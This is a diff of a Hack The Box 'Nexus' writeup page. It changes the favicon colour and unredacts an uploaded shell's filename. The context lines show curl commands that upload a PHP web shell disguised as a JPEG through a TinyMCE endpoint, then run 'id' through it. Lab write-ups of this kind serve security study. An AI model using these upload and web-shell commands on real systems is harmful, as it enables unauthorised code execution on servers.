@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Nexus — HTB Writeup · Arthur Trapp</title>
 <meta name="description" content="Git-history credential leak → TinyMCE unrestricted upload (CVE-2026-38526) → root git-tree path traversal" />
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23181a1e'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232c3b4d'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
@@ -143,9 +143,9 @@ curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: bill
 curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: billing.nexus.htb&quot; \
   -H &quot;X-XSRF-TOKEN: $XSRF&quot; -F &quot;file=@shell.php;type=image/jpeg;filename=shell.php&quot; \
   http://billing.nexus.htb/admin/tinymce/upload
-# {&quot;location&quot;:&quot;http://billing.nexus.htb/storage/tinymce/[REDACTED].php&quot;}
+# {&quot;location&quot;:&quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php&quot;}
 
-curl -s &quot;http://billing.nexus.htb/storage/tinymce/[REDACTED].php?cmd=id&quot;
+curl -s &quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php?cmd=id&quot;
 # uid=33(www-data) gid=33(www-data) ...
 </code></pre>
 <h3>4. <code>.env</code> discovery — rotated DB password</h3>
